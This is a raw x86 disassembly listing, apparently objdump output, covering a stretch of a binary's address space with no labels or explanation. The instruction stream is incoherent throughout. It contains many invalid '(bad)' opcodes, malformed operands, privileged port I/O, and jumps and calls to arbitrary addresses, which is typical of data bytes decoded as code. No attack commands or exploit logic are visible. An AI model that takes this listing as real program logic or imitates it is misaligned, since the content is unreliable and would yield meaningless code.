  4bd89d:	pop    ss
  4bd89e:	mov    BYTE PTR [ecx-0x77898b17],ch
  4bd8a4:	mov    cl,0x4a
  4bd8a6:	xchg   ebx,eax
  4bd8a7:	or     DWORD PTR [ebx-0x1e],0xbc4e8b68
  4bd8ae:	xchg   ebx,eax
  4bd8af:	shl    DWORD PTR [esi+0xeb023b5],1
  4bd8b5:	push   0xf3d35802
  4bd8ba:	or     BYTE PTR [ecx+ebp*4+0x2f],ch
  4bd8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bd8bf:	(bad)  
  4bd8c0:	(bad)  
  4bd8c1:	outs   dx,BYTE PTR ds:[esi]
  4bd8c2:	xchg   DWORD PTR [esi-0x4d],edx
  4bd8c5:	loopne 0x4bd87c
  4bd8c7:	loope  0x4bd8e9
  4bd8c9:	xchg   edx,eax
  4bd8ca:	pop    edi
  4bd8cb:	(bad)  [edx]
  4bd8cd:	push   ss
  4bd8ce:	dec    eax
  4bd8cf:	inc    ebx
  4bd8d0:	jo     0x4bd8fb
  4bd8d2:	call   0x6a8b:0x7936c8ce
  4bd8d9:	fwait
  4bd8da:	mov    DWORD PTR [edi],esi
  4bd8dc:	mov    DWORD PTR [eax+0x33b6d4aa],ecx
  4bd8e2:	iret   
  4bd8e3:	pop    edi
  4bd8e4:	xor    al,0x2e
  4bd8e6:	adc    al,0xd7
  4bd8e8:	xor    BYTE PTR gs:[eax],dh
  4bd8eb:	jo     0x4bd8f0
  4bd8ed:	mov    eax,ds:0xc9287cf0
  4bd8f2:	test   BYTE PTR [ecx],ah
  4bd8f4:	adc    BYTE PTR [edi+0xe],ah
  4bd8f7:	pop    eax
  4bd8f8:	mov    ch,0xd
  4bd8fa:	xchg   ecx,eax
  4bd8fb:	adc    bl,BYTE PTR [ebx+ebp*1-0x749326fc]
  4bd902:	fstp   DWORD PTR [eax-0x5f]
  4bd905:	leave  
  4bd906:	adc    eax,0xffa90db5
  4bd90b:	push   ecx
  4bd90c:	or     BYTE PTR [edx+0x5b],cl
  4bd90f:	xchg   esp,eax
  4bd910:	add    DWORD PTR [ecx+0x69657410],edx
  4bd916:	outs   dx,DWORD PTR ds:[esi]
  4bd917:	or     BYTE PTR [ecx+ebx*2+0x7],bh
  4bd91b:	ins    DWORD PTR es:[edi],dx
  4bd91c:	or     ecx,ecx
  4bd91e:	fist   WORD PTR [edx+edx*8]
  4bd921:	mov    cl,0x65
  4bd923:	fsub   DWORD PTR [edi]
  4bd925:	test   al,0x24
  4bd927:	and    BYTE PTR [edi+ebp*4+0x228d6dd9],dh
  4bd92e:	nop
  4bd92f:	repz mov edi,0xfd64c10d
  4bd935:	cmp    eax,0x2b594d1
  4bd93a:	inc    esi
  4bd93b:	push   ebp
  4bd93c:	inc    esi
  4bd93d:	ss sbb bh,cl
  4bd940:	mov    ebx,0x1022635f
  4bd945:	(bad)  
  4bd947:	mov    ch,0xc9
  4bd949:	stos   BYTE PTR es:[edi],al
  4bd94a:	enter  0x19d4,0xe4
  4bd94e:	or     cl,dh
  4bd950:	dec    ebx
  4bd951:	push   es
  4bd952:	pop    edx
  4bd953:	aaa    
  4bd954:	or     DWORD PTR [edx+0x68],ebp
  4bd957:	sub    DWORD PTR [edi+0x3ae54231],esi
  4bd95d:	popf   
  4bd95e:	adc    esi,eax
  4bd960:	mov    bl,0x62
  4bd962:	aaa    
  4bd963:	adc    DWORD PTR [esi+0x72],esi
  4bd966:	ret    0xd0a6
  4bd969:	sbb    BYTE PTR [eax-0x43],dh
  4bd96c:	arpl   WORD PTR [edx+0x18],di
  4bd96f:	(bad)  
  4bd970:	xor    BYTE PTR [esi+0x1e],bl
  4bd973:	push   0x20
  4bd975:	xchg   ebx,eax
  4bd976:	cs push ebp
  4bd978:	xchg   esi,eax
  4bd979:	scas   al,BYTE PTR es:[edi]
  4bd97a:	inc    esp
  4bd97b:	or     al,0xf6
  4bd97d:	test   al,0x98
  4bd97f:	inc    esp
  4bd980:	mov    cl,BYTE PTR [ebp+ecx*4+0x4ba7ab16]
  4bd987:	or     DWORD PTR [esi-0x20],ebp
  4bd98a:	mov    WORD PTR [ebp+0x47a5a556],fs
  4bd990:	jne    0x4bd93b
  4bd992:	adc    BYTE PTR [edx+0x495dd581],cl
  4bd998:	xchg   edi,eax
  4bd999:	sub    BYTE PTR ds:0xf84311e6,ch
  4bd99f:	mov    BYTE PTR [ebp+edx*4-0x3e],dh
  4bd9a3:	add    cl,BYTE PTR [ecx]
  4bd9a5:	push   cs
  4bd9a6:	push   ecx
  4bd9a7:	pop    edx
  4bd9a8:	out    0x61,eax
  4bd9aa:	popa   
  4bd9ab:	lock sub edx,DWORD PTR [edi+eax*1-0x46]
  4bd9b0:	mov    ds:0x659bff90,al
  4bd9b5:	mov    eax,ds:0xd36d0fbd
  4bd9ba:	das    
  4bd9bb:	push   ebx
  4bd9bc:	dec    edi
  4bd9bd:	dec    esi
  4bd9be:	dec    ebx
  4bd9bf:	sbb    DWORD PTR [edx],0x63
  4bd9c2:	mov    eax,ds:0xe40b9070
  4bd9c7:	adc    al,0xec
  4bd9c9:	jne    0x4bd9ea
  4bd9cb:	xor    BYTE PTR [eax],bl
  4bd9cd:	xchg   ebp,eax
  4bd9ce:	adc    al,BYTE PTR [ebp+0x6a30c1e9]
  4bd9d4:	adc    esp,DWORD PTR [edi-0x5]
  4bd9d7:	adc    al,0x8b
  4bd9d9:	enter  0x3c8a,0x8b
  4bd9dd:	clc    
  4bd9de:	or     al,0x3f
  4bd9e0:	push   esi
  4bd9e1:	jb     0x4bda4f
  4bd9e3:	sub    DWORD PTR [eax],ecx
  4bd9e5:	inc    esp
  4bd9e6:	mov    ebx,ebp
  4bd9e8:	xchg   BYTE PTR [eax],bl
  4bd9ea:	scas   eax,DWORD PTR es:[edi]
  4bd9eb:	pop    ebx
  4bd9ec:	aad    0x5f
  4bd9ee:	xlat   BYTE PTR ds:[ebx]
  4bd9ef:	fs xchg ebx,eax
  4bd9f1:	imul   ecx,DWORD PTR [ebx+0x8],0xffffffec
  4bd9f5:	outs   dx,BYTE PTR ds:[esi]
  4bd9f6:	push   ebx
  4bd9f7:	pushf  
  4bd9f8:	xchg   esi,eax
  4bd9f9:	mov    ?,WORD PTR [esp+ebx*1]
  4bd9fc:	cmc    
  4bd9fd:	mov    eax,ds:0x1510c85c
  4bda02:	or     edx,DWORD PTR [ebp+0x16]
  4bda05:	lds    esp,FWORD PTR [esi+0x2]
  4bda08:	mov    dh,0x3a
  4bda0a:	push   edi
  4bda0b:	or     ebp,DWORD PTR [eax+0x59448a18]
  4bda11:	inc    eax
  4bda12:	or     edi,DWORD PTR [ecx]
  4bda14:	sub    al,BYTE PTR [ecx+eiz*8]
  4bda17:	pop    ebx
  4bda18:	in     eax,0x5c
  4bda1a:	or     esp,DWORD PTR [ebx]
  4bda1c:	push   0x1d5bbb95
  4bda21:	sbb    ah,BYTE PTR [ebx+0x3]
  4bda24:	or     bh,cl
  4bda26:	xor    BYTE PTR [edx+0x75],cl
  4bda29:	jo     0x4bd9ae
  4bda2b:	xchg   edi,eax
  4bda2c:	cmp    ebx,edi
  4bda2e:	jecxz  0x4bda02
  4bda30:	les    ebp,FWORD PTR [ecx+0x2d1e75f7]
  4bda36:	test   eax,0x4727461b
  4bda3b:	call   FWORD PTR [ebx]
  4bda3d:	lods   al,BYTE PTR ds:[esi]
  4bda3e:	push   ebx
  4bda3f:	push   0x4d
  4bda41:	jmp    0x7b2e309c
  4bda46:	stos   DWORD PTR es:[edi],eax
  4bda47:	fst    QWORD PTR [edi+0x29c359fe]
  4bda4d:	sub    al,0xa3
  4bda4f:	jo     0x4bda17
  4bda51:	jb     0x4bda9c
  4bda53:	push   esp
  4bda54:	cmp    al,bl
  4bda56:	add    dl,BYTE PTR [esi+0x7267be1]
  4bda5c:	dec    ebx
  4bda5d:	out    dx,eax
  4bda5e:	repz push es
  4bda60:	sub    ch,BYTE PTR [esi]
  4bda62:	data16 or BYTE PTR [edx],dh
  4bda65:	and    al,0x5f
  4bda67:	aaa    
  4bda68:	pop    es
  4bda69:	mov    BYTE PTR [eax],dl
  4bda6b:	call   FWORD PTR ds:0x57cd50cb
  4bda71:	sub    eax,0xc76a44bd
  4bda76:	(bad)  
  4bda77:	push   eax
  4bda78:	sbb    edi,eax
  4bda7a:	repz cs jmp 0x4bdaf2
  4bda7e:	pop    esp
  4bda7f:	pusha  
  4bda80:	mov    al,ds:0x560186
  4bda85:	loop   0x4bdaa4
  4bda87:	je     0x4bdb01
  4bda89:	push   ss
  4bda8a:	je     0x4bda5d
  4bda8c:	push   ss
  4bda8d:	imul   eax,DWORD PTR [ebx+0x3a],0x14a8246c
  4bda94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bda95:	adc    ecx,DWORD PTR [ecx+0x4176a52b]
  4bda9b:	neg    DWORD PTR [edx+ebx*2]
  4bda9e:	xchg   edx,eax
  4bda9f:	or     cl,bl
  4bdaa1:	push   edi
  4bdaa2:	ja     0x4bdaed
  4bdaa4:	ja     0x4bdac2
  4bdaa6:	and    ch,ah
  4bdaa8:	out    dx,al
  4bdaa9:	stos   BYTE PTR es:[edi],al
  4bdaaa:	call   0x95201b53
  4bdaaf:	add    al,BYTE PTR [eax+ebp*1+0x6f]
  4bdab3:	jmp    0x579f0322
  4bdab8:	ins    BYTE PTR es:[edi],dx
  4bdab9:	mov    al,ds:0x88131cfe
  4bdabe:	les    eax,FWORD PTR [esi]
  4bdac0:	jl     0x4bdaa5
  4bdac2:	jae    0x4bdaca
  4bdac4:	test   eax,0xe56f581a
  4bdac9:	push   es
  4bdaca:	push   edx
  4bdacb:	sub    eax,0xf142002
  4bdad0:	leave  
  4bdad1:	jo     0x4bdb07
  4bdad3:	das    
  4bdad4:	clc    
  4bdad5:	inc    ebx
  4bdad6:	test   dh,bl
  4bdad8:	sbb    ecx,eax
  4bdada:	and    edi,DWORD PTR [esi+ecx*4]
  4bdadd:	popa   
  4bdade:	fcomp  QWORD PTR [esi+0x458935a]
  4bdae4:	push   cs
  4bdae5:	pop    ebx
  4bdae6:	sub    BYTE PTR [edi+0x10],ah
  4bdae9:	outs   dx,DWORD PTR ds:[esi]
  4bdaea:	fcom   DWORD PTR [edx+0x49]
  4bdaed:	or     dh,ah
  4bdaef:	push   0x10
  4bdaf1:	adc    BYTE PTR ss:[eax],0xc8
  4bdaf5:	jae    0x4bdb41
  4bdaf7:	imul   ecx,DWORD PTR [edx],0x7
  4bdafa:	int    0x92
  4bdafc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bdafd:	pusha  
  4bdafe:	inc    eax
  4bdaff:	mov    al,ds:0x6be951a0
  4bdb04:	and    esp,DWORD PTR [ebp-0x5e]
  4bdb07:	xchg   ebx,eax
  4bdb08:	push   eax
  4bdb09:	pop    eax
  4bdb0a:	lea    edi,[eax]
  4bdb0c:	int    0xe3
  4bdb0e:	dec    ebx
  4bdb0f:	lock xor dh,bl
  4bdb12:	mov    WORD PTR [eax+ecx*4-0x3b5f5bc],ds
  4bdb19:	in     eax,dx
  4bdb1a:	inc    edx
  4bdb1b:	mov    cl,0xe8
  4bdb1d:	sub    eax,0xc5ab4d66
  4bdb22:	push   0x3ea6cbc5
  4bdb27:	leave  
  4bdb28:	(bad)  
  4bdb2a:	ror    DWORD PTR [eax],0x9c
  4bdb2d:	or     dl,BYTE PTR [eax-0x49]
  4bdb30:	adc    bl,BYTE PTR [esi]
  4bdb32:	jns    0x4bdb76
  4bdb34:	mov    DWORD PTR [edi+0x74],edx
  4bdb37:	or     eax,0xbc000dc2
  4bdb3c:	rcl    DWORD PTR [ecx+0x57],1
  4bdb3f:	push   ds
  4bdb40:	push   eax
  4bdb41:	(bad)  
  4bdb42:	add    al,0xc2
  4bdb44:	push   edx
  4bdb45:	sbb    edi,DWORD PTR [edi]
  4bdb47:	jne    0x4bdae3
  4bdb49:	and    al,0x3a
  4bdb4c:	ins    BYTE PTR es:[edi],dx
  4bdb4d:	add    esp,DWORD PTR [edi]
  4bdb4f:	inc    edx
  4bdb50:	push   cs
  4bdb51:	popa   
  4bdb52:	data16 ins BYTE PTR es:[edi],dx
  4bdb54:	adc    bh,BYTE PTR [esi+0x4f4d102a]
  4bdb5a:	mov    eax,edi
  4bdb5c:	jno    0x4bdb4e
  4bdb5e:	sub    eax,0x1234269d
  4bdb63:	push   esp
  4bdb64:	push   ecx
  4bdb65:	ret    
  4bdb66:	and    ebp,0xffffffe9
  4bdb69:	nop
  4bdb6a:	shl    BYTE PTR [esp+edx*2],1
  4bdb6d:	es loope 0x4bdaf5
  4bdb70:	add    DWORD PTR [ebx-0x13f6e0b0],0xffffffde
  4bdb77:	inc    esi
  4bdb78:	jmp    0x75807b87
  4bdb7d:	add    bh,BYTE PTR [ebp-0x7d]
  4bdb80:	test   eax,0x62129f04
  4bdb85:	test   BYTE PTR [ebx+0x46],cl
  4bdb88:	cmp    al,0xb0
  4bdb8a:	and    BYTE PTR [esi+0x68a880a0],dl
  4bdb90:	in     al,dx
  4bdb91:	(bad)  
  4bdb92:	push   edi
  4bdb93:	push   ecx
  4bdb94:	inc    eax
  4bdb95:	pop    edx
  4bdb96:	pop    ecx
  4bdb97:	imul   eax,DWORD PTR [edx+0x6a],0x5b431580
  4bdb9e:	sbb    DWORD PTR [eax+ebp*2],0xb101229f
  4bdba5:	lds    ecx,FWORD PTR [edx+0x3e]
  4bdba8:	and    DWORD PTR [ebx+0x50413e03],esp
  4bdbae:	scas   al,BYTE PTR es:[edi]
  4bdbaf:	mov    ch,0x2b
  4bdbb1:	and    ebx,DWORD PTR [ebx]
  4bdbb3:	and    BYTE PTR [edi],dh
  4bdbb5:	loopne 0x4bdb3e
  4bdbb7:	leave  
  4bdbb8:	and    BYTE PTR [ebx+0x5d5490aa],bh
  4bdbbe:	push   esi
  4bdbbf:	xor    al,0x3a
  4bdbc1:	sub    eax,0xc0dd8cbd
  4bdbc6:	push   ebx
  4bdbc7:	jp     0x4bdb97
  4bdbc9:	mov    dl,0x2e
  4bdbcb:	and    al,0xd1
  4bdbcd:	jp     0x4bdb53
  4bdbcf:	sti    
  4bdbd0:	xchg   edx,eax
  4bdbd1:	mov    ch,0xd3
  4bdbd3:	pop    edx
  4bdbd4:	adc    bl,dl
  4bdbd6:	cs nop
  4bdbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bdbd9:	adc    ebp,DWORD PTR [eax+0x52]
  4bdbdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bdbdd:	es mov cl,0x91
  4bdbe0:	ret    0x7d40
  4bdbe3:	test   al,0x10
  4bdbe5:	call   0xd3ed3eee
  4bdbea:	pop    eax
  4bdbeb:	cmp    DWORD PTR [esp+edi*8],0x30a65dfe
  4bdbf2:	jno    0x4bdc3f
  4bdbf4:	push   esi
  4bdbf5:	jmp    0x80565819
  4bdbfa:	pop    eax
  4bdbfb:	or     BYTE PTR [eax+eax*2],cl
  4bdbfe:	pop    ss
  4bdbff:	les    esp,FWORD PTR [edx]
  4bdc01:	sbb    ah,ah
  4bdc03:	push   ebx
  4bdc04:	xor    BYTE PTR [edi+eax*1-0x25],dh
  4bdc08:	push   ds
  4bdc09:	add    eax,0x33aeb560
  4bdc0e:	daa    
  4bdc0f:	fstp   QWORD PTR [ebx+ecx*8]
  4bdc12:	jp     0x4bdc34
  4bdc14:	lods   al,BYTE PTR ds:[esi]
  4bdc15:	fs pop edx
  4bdc17:	push   ebx
  4bdc18:	xchg   ebp,eax
  4bdc19:	jnp    0x4bdc3c
  4bdc1b:	pop    ecx
  4bdc1c:	dec    edi
  4bdc1d:	push   esp
  4bdc1e:	call   0xc87b7430
  4bdc23:	sbb    DWORD PTR [edx+esi*2],0xc8021801
  4bdc2a:	and    DWORD PTR [edi],eax
  4bdc2c:	jb     0x4bdc4e
  4bdc2e:	add    ebp,DWORD PTR [eax]
  4bdc30:	jb     0x4bdc52
  4bdc32:	xchg   DWORD PTR [esp+eax*1],ebx
  4bdc35:	xor    BYTE PTR ds:0x1c81c8ac,al
  4bdc3b:	cmp    BYTE PTR [esi],al
  4bdc3d:	add    DWORD PTR [esi+edx*1],0x17
  4bdc41:	adc    eax,DWORD PTR [ecx-0x24acbed1]
  4bdc47:	icebp  
  4bdc48:	mov    ecx,0x956a78fc
  4bdc4d:	pop    edi
  4bdc4e:	adc    BYTE PTR ds:0x4389c252,bl
  4bdc54:	dec    ecx
  4bdc55:	outs   dx,DWORD PTR ds:[esi]
  4bdc56:	dec    ebp
  4bdc57:	hlt    
  4bdc58:	cmp    dl,BYTE PTR [esi]
  4bdc5a:	add    ebp,eax
  4bdc5c:	dec    edx
  4bdc5d:	je     0x4bdc88
  4bdc5f:	dec    ebp
  4bdc60:	shl    BYTE PTR ds:0x51cea971,cl
  4bdc66:	cdq    
  4bdc67:	mov    ebx,0xc9172c89
  4bdc6c:	add    eax,0x10d6fcf8
  4bdc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bdc72:	or     DWORD PTR [ecx],ebp
  4bdc74:	retf   
  4bdc75:	xchg   esp,eax
  4bdc76:	xchg   edx,eax
  4bdc77:	mov    eax,0xe01f3142
  4bdc7c:	adc    ah,0x8a
  4bdc7f:	sbb    BYTE PTR [edi-0xf],bl
  4bdc82:	std    
  4bdc83:	add    BYTE PTR [ebp-0x4ddb7273],dh
  4bdc89:	jmp    0x4bdc5b
  4bdc8b:	cmp    esp,DWORD PTR [eax+eiz*8+0x13]
  4bdc8f:	xchg   edx,eax
  4bdc90:	sbb    dl,BYTE PTR [ebx-0x3f]
  4bdc93:	xchg   esp,eax
  4bdc94:	and    dh,BYTE PTR [eax]
  4bdc96:	test   BYTE PTR [ebx-0x6523df93],dh
  4bdc9c:	cld    
  4bdc9d:	sti    
  4bdc9e:	push   eax
  4bdc9f:	push   ebx
  4bdca0:	and    dl,BYTE PTR [edi]
  4bdca2:	lods   eax,DWORD PTR ds:[esi]
  4bdca3:	xor    ebx,esp
  4bdca5:	lds    ecx,FWORD PTR [esi+0x2e]
  4bdca8:	aam    0xeb
  4bdcaa:	mov    ah,0x1
  4bdcac:	mov    ebp,0x5a46b445
  4bdcb1:	sbb    DWORD PTR [ebx-0x2b],0x2e34f96
  4bdcb8:	push   edx
  4bdcb9:	xchg   ebp,eax
  4bdcba:	or     al,dh
  4bdcbc:	enter  0x3a06,0xe8
  4bdcc0:	mov    esp,0x1ccd2572
  4bdcc5:	ret    
  4bdcc6:	or     ecx,edi
  4bdcc8:	mov    ds:0x8b04566d,eax
  4bdccd:	inc    edx
  4bdcce:	sbb    al,0x55
  4bdcd0:	call   0x40b8859d
  4bdcd5:	lods   eax,DWORD PTR ds:[esi]
  4bdcd6:	bound  ecx,QWORD PTR [ebp+0x37e82690]
  4bdcdc:	cwde   
  4bdcdd:	pop    es
  4bdcde:	jb     0x4bdd00
  4bdce0:	pop    es
  4bdce1:	mov    al,0x6a
  4bdce3:	adc    edi,DWORD PTR [eax-0x54]
  4bdce6:	jle    0x4bdcf8
  4bdce8:	xchg   edi,eax
  4bdce9:	in     eax,0x90
  4bdceb:	pop    ebx
  4bdcec:	adc    al,0xb
  4bdcee:	or     eax,0x86a91940
  4bdcf3:	xor    al,0x6
  4bdcf5:	adc    al,0xd0
  4bdcf7:	inc    edx
  4bdcf8:	out    dx,eax
  4bdcf9:	sub    BYTE PTR [edx-0x405abd89],dh
  4bdcff:	cmc    
  4bdd00:	cdq    
  4bdd01:	dec    eax
  4bdd03:	ficom  WORD PTR [ecx]
  4bdd05:	cmp    al,0x3b
  4bdd07:	imul   eax,DWORD PTR [eax-0x4b017906],0x36
  4bdd0e:	(bad)  
  4bdd0f:	push   ecx
  4bdd10:	ret    0x3bdf
  4bdd13:	fmul   DWORD PTR [edx]
  4bdd15:	(bad)  
  4bdd16:	sub    ebx,eax
  4bdd18:	push   ebx
  4bdd19:	stos   DWORD PTR es:[edi],eax
  4bdd1a:	sub    ebp,DWORD PTR [esi]
  4bdd1c:	sub    eax,0xea036441
  4bdd21:	(bad)  
  4bdd22:	and    eax,0xd45a5780
  4bdd27:	sbb    eax,0xc90b49d1
  4bdd2c:	inc    edx
  4bdd2d:	jnp    0x4bdd1f
  4bdd2f:	cmp    eax,0x361aa194
  4bdd34:	dec    esi
  4bdd35:	xchg   edi,eax
  4bdd36:	add    ecx,esp
  4bdd38:	adc    DWORD PTR [esi],ebx
  4bdd3a:	imul   esi,DWORD PTR [eax],0x42467ae4
  4bdd40:	fmul   DWORD PTR [edx-0x4c]
  4bdd43:	loope  0x4bdd3c
  4bdd45:	fnstcw WORD PTR [edx-0x77]
  4bdd48:	inc    esp
  4bdd49:	imul   esp,ecx,0xffffffbc
  4bdd4c:	test   esp,ebp
  4bdd4e:	and    esp,edi
  4bdd50:	or     al,BYTE PTR [esi-0x72f029fc]
  4bdd56:	push   ss
  4bdd57:	(bad)  
  4bdd58:	pop    ebx
  4bdd59:	cwde   
  4bdd5a:	call   0xf99b7aea
  4bdd5f:	imul   edi,edx
  4bdd62:	or     al,0x19
  4bdd64:	dec    BYTE PTR [ecx-0x62]
  4bdd67:	lea    edx,[edi+ecx*1]
  4bdd6a:	mov    ecx,edi
  4bdd6c:	pop    esi
  4bdd6d:	inc    eax
  4bdd6e:	ror    BYTE PTR [ecx-0x54],0xe4
  4bdd72:	mov    ds:0xe36d9c8,al
  4bdd77:	lahf   
  4bdd78:	xchg   ebx,eax
  4bdd79:	stos   DWORD PTR es:[edi],eax
  4bdd7a:	aad    0xae
  4bdd7c:	or     DWORD PTR [edx],edi
  4bdd7e:	loopne 0x4bdde6
  4bdd80:	leave  
  4bdd81:	mov    edx,0x1856c803
  4bdd86:	(bad)  
  4bdd87:	xchg   edi,eax
  4bdd88:	push   ecx
  4bdd89:	add    al,0x10
  4bdd8b:	repnz inc edi
  4bdd8d:	sbb    BYTE PTR [eax],0x28
  4bdd90:	popf   
  4bdd91:	xlat   BYTE PTR ds:[ebx]
  4bdd92:	add    al,BYTE PTR [eax+eiz*4]
  4bdd95:	je     0x4bdddc
  4bdd97:	jmp    0x4bdd38
  4bdd99:	xchg   edx,eax
  4bdd9a:	(bad)  
  4bdd9b:	or     dl,BYTE PTR [esi+eax*1-0x11b5dea9]
  4bdda2:	(bad)  
  4bdda3:	adc    eax,DWORD PTR [esp+ebx*1-0x476ff821]
  4bddaa:	sub    ecx,eax
  4bddac:	mov    ds:0x82dc184,al
  4bddb1:	pop    esi
  4bddb2:	sub    BYTE PTR [edx+0x15b44625],0x6b
  4bddb9:	fcomp  st(4)
  4bddbb:	xchg   edi,eax
  4bddbc:	(bad)  [eax]
  4bddbe:	loop   0x4bdd61
  4bddc0:	pop    esp
  4bddc1:	(bad)  
  4bddc2:	hlt    
  4bddc3:	fcom   QWORD PTR [ebx-0x13ba998c]
  4bddc9:	dec    eax
  4bddca:	xchg   esi,eax
  4bddcb:	push   ds
  4bddcc:	adc    al,0x26
  4bddce:	add    ecx,DWORD PTR ss:[ebx]
  4bddd1:	ins    DWORD PTR es:[edi],dx
  4bddd2:	and    ah,al
  4bddd4:	push   esi
  4bddd5:	les    edx,FWORD PTR [ebx]
  4bddd7:	inc    ebp
  4bddd8:	outs   dx,DWORD PTR ds:[esi]
  4bddd9:	inc    si
  4bdddb:	inc    ebp
  4bdddc:	sub    BYTE PTR [eax+0x9975722],ch
  4bdde2:	sbb    BYTE PTR [eax],bl
  4bdde4:	pop    esi
  4bdde5:	scas   eax,DWORD PTR es:[edi]
  4bdde6:	in     eax,dx
  4bdde7:	sbb    BYTE PTR [eax+0x40],al
  4bddea:	sar    DWORD PTR [edx-0x5342f178],0x43
  4bddf1:	xchg   ecx,eax
  4bddf2:	adc    BYTE PTR [ebx],ch
  4bddf4:	ja     0x4bdde6
  4bddf6:	mov    eax,ds:0xe4114c61
  4bddfb:	xor    al,BYTE PTR [ecx]
  4bddfd:	pushf  
  4bddfe:	add    bl,BYTE PTR [esp+ebx*4]
  4bde01:	es dec ecx
  4bde03:	cmp    bl,BYTE PTR [edx+eiz*8]
  4bde06:	(bad)  
  4bde07:	popa   
  4bde08:	pop    ss
  4bde09:	or     bh,bh
  4bde0b:	sub    esi,DWORD PTR [ebp+0x28]
  4bde0e:	shl    BYTE PTR [edx],1
  4bde10:	xor    BYTE PTR [eax-0x79dc6668],al
  4bde16:	add    bl,BYTE PTR [ebx+ecx*1-0x6b]
  4bde1a:	push   cs
  4bde1b:	je     0x4bde4a
  4bde1d:	pop    eax
  4bde1e:	sub    esp,DWORD PTR [si+0x2]
  4bde22:	sub    edx,DWORD PTR [esi]
  4bde24:	iret   
  4bde25:	lahf   
  4bde26:	es or  bl,dl
  4bde29:	stos   DWORD PTR es:[edi],eax
  4bde2a:	push   ss
  4bde2b:	and    eax,0x48327448
  4bde30:	xchg   esp,eax
  4bde31:	in     al,0x74
  4bde33:	lds    esi,FWORD PTR [ebp+0x62]
  4bde36:	call   0x79a9c93d
  4bde3b:	mov    ecx,0x9e35a26d
  4bde40:	push   ds
  4bde41:	je     0x4bde67
  4bde43:	or     BYTE PTR [edi],al
  4bde45:	je     0x4bde5f
  4bde47:	xchg   esp,eax
  4bde48:	loop   0x4bde93
  4bde4a:	mov    eax,0xbb46750b
  4bde4f:	mov    esp,0xffc0c6d
  4bde54:	cwde   
  4bde55:	lahf   
  4bde56:	ret    0x728d
  4bde59:	add    ebx,ebp
  4bde5b:	xor    edi,DWORD PTR [edi-0x15]
  4bde5e:	sub    al,0xb4
  4bde60:	xchg   esp,eax
  4bde61:	lea    ebp,[edi]
  4bde63:	ja     0x4bde7c
  4bde65:	and    BYTE PTR [edx+0x1280d1d2],cl
  4bde6b:	fimul  DWORD PTR [eax+0x59a6d72c]
  4bde71:	xchg   ecx,eax
  4bde72:	push   0xa841c10a
  4bde77:	cmc    
  4bde78:	ins    DWORD PTR es:[edi],dx
  4bde79:	loop   0x4bddfc
  4bde7b:	inc    ebx
  4bde7c:	push   ecx
  4bde7d:	inc    edi
  4bde7e:	loope  0x4bdec9
  4bde80:	dec    esi
  4bde81:	xor    al,0xf3
  4bde83:	sub    eax,DWORD PTR [edx+eax*2+0x3062750d]
  4bde8a:	rcl    DWORD PTR [eax],1
  4bde8c:	pop    eax
  4bde8d:	sbb    ah,dl
  4bde8f:	mov    DWORD PTR [ecx+ebp*4],ebx
  4bde92:	push   ds
  4bde93:	cmp    BYTE PTR [edx],al
  4bde95:	imul   edi,DWORD PTR [ebx-0x2d2f7cdc],0x11f4a193
  4bde9f:	and    al,0x85
  4bdea1:	xchg   BYTE PTR [edi],dl
  4bdea3:	pop    ss
  4bdea4:	jne    0x4bdeb6
  4bdea6:	imul   edx,DWORD PTR [edx+0x4],0x7b350fe1
  4bdead:	or     BYTE PTR [esi+0x6b],dh
  4bdeb0:	pop    ebp
  4bdeb1:	add    al,0xb4
  4bdeb3:	jns    0x4bdef0
  4bdeb5:	jb     0x4bdf2b
  4bdeb7:	push   edi
  4bdeb8:	push   es
  4bdeb9:	dec    edx
  4bdeba:	jne    0x4bdf23
  4bdebc:	add    al,0x47
  4bdebe:	ror    ah,0x77
  4bdec1:	add    dh,BYTE PTR [eax-0x1c]
  4bdec4:	sub    edx,DWORD PTR [eax+0x55825246]
  4bdeca:	js     0x4bdf3c
  4bdecc:	xchg   ecx,eax
  4bdecd:	ret    0x8550
  4bded0:	out    dx,eax
  4bded1:	inc    ebx
  4bded2:	pusha  
  4bded3:	and    eax,0xf42e3457
  4bded8:	mov    edi,0x2ec4c35e
  4bdedd:	ret    
  4bdede:	mov    eax,esi
  4bdee0:	adc    edx,DWORD PTR [esi+0x5c]
  4bdee3:	xor    BYTE PTR [edx],0xd
  4bdee6:	or     DWORD PTR [eax],ecx
  4bdee8:	data16 adc al,BYTE PTR [eax+ebx*8+0x6cfc3704]
  4bdef0:	adc    DWORD PTR [eax+0x8],edi
  4bdef3:	dec    ebp
  4bdef4:	std    
  4bdef5:	(bad)  
  4bdef6:	mov    bl,bl
  4bdef8:	push   es
  4bdef9:	push   cs
  4bdefa:	sti    
  4bdefb:	ins    DWORD PTR es:[edi],dx
  4bdefc:	pusha  
  4bdefd:	inc    eax
  4bdefe:	imul   eax,edi,0xa875f11a
  4bdf04:	xchg   esi,eax
  4bdf05:	add    BYTE PTR [ecx+eiz*2+0x485c5221],cl
  4bdf0c:	popf   
  4bdf0d:	mov    al,ds:0xe16cd85f
  4bdf12:	mov    WORD PTR [esi+0x5005025f],ss
  4bdf18:	add    al,al
  4bdf1a:	mov    dh,bl
  4bdf1c:	fs adc esp,edx
  4bdf1f:	push   0x50
  4bdf21:	sbb    DWORD PTR [ecx],ecx
  4bdf23:	lock and bl,ch
  4bdf26:	lds    edx,FWORD PTR [ecx-0x77]
  4bdf29:	push   eax
  4bdf2a:	push   0x68
  4bdf2c:	sbb    BYTE PTR [esi-0x46],0x28
  4bdf30:	sub    DWORD PTR [edx-0x54],0x4a
  4bdf34:	push   ebp
  4bdf35:	xor    BYTE PTR [ebx],cl
  4bdf37:	outs   dx,BYTE PTR ds:[esi]
  4bdf38:	sbb    edi,DWORD PTR es:[eax-0x2c]
  4bdf3c:	cmp    DWORD PTR [ecx-0x56f88b0a],edx
  4bdf42:	leave  
  4bdf43:	push   es
  4bdf44:	mov    cs,esp
  4bdf46:	jno    0x4bdede
  4bdf48:	cld    
  4bdf49:	cmp    BYTE PTR ds:0x14d91106,al
  4bdf4f:	in     al,0x7
  4bdf51:	mov    dh,0x92
  4bdf53:	mov    ecx,0x659011a
  4bdf58:	xchg   esp,eax
  4bdf59:	mov    ?,WORD PTR [edx*1-0x2adf922e]
  4bdf60:	push   edx
